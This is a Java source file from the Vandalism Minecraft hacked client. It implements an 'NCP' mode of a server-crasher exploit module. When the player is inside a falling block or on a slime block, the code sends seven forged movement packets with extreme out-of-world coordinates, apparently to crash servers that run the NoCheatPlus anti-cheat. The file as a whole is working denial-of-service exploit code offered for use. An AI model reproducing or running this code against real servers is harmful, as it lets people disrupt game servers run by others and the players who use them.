/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.impl.single;

import de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.SingleExecutionModuleMode;
import net.minecraft.block.SlimeBlock;
import net.minecraft.entity.Entity;
import net.minecraft.entity.FallingBlockEntity;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class NCPModuleMode extends SingleExecutionModuleMode<ServerCrasherModule> {

    public NCPModuleMode(final ServerCrasherModule parent) {
        super("NCP", parent);
    }

    @Override
    protected void onExecute() {
        boolean insideFallingBlock = false;
        for (final Entity entity : this.mc.world.getEntities()) {
            if (entity instanceof FallingBlockEntity && entity.distanceTo(this.mc.player) <= 1) {
                insideFallingBlock = true;
                break;
            }
        }
        if (insideFallingBlock || (this.mc.world.getBlockState(this.mc.player.getBlockPos().down()).getBlock() instanceof SlimeBlock)) {
            for (int j = 0; j < 7; j++) {
                final Random random = ThreadLocalRandom.current();
                double newX = random.nextDouble(1.7E7, 2.0E7);
                double newZ = random.nextDouble(1.7E7, 2.0E7);
                if (j % 2 == 0) {
                    newX = -newX;
                    newZ = -newZ;
                }
                this.mc.getNetworkHandler().getConnection().send(new PlayerMoveC2SPacket.PositionAndOnGround(
                        newX,
                        -3.0E7,
                        newZ,
                        true
                ), null, true);
            }
        }
    }

}
